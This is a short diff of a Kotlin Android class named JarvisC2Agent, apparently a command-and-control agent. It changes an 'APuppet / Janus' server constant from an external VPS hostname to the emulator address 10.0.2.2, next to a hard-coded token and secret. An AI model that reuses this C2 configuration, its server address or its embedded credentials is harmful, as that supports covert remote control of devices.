@@ -35,7 +35,7 @@ class JarvisC2Agent(private val context: Context) {
             "KUn9Nf1WGiBb31mEHrU5-NDo_K-BEUA0laGL6yFdnT0"
 
         // ── APuppet / Janus server ──────────────────────────────────────────
-        private const val APUPPET_SERVER   = "208414.landvps.online"
+        private const val APUPPET_SERVER   = "10.0.2.2"
         private const val APUPPET_SECRET   = "9qm7DfBd"
 
         // ── Polling ─────────────────────────────────────────────────────────
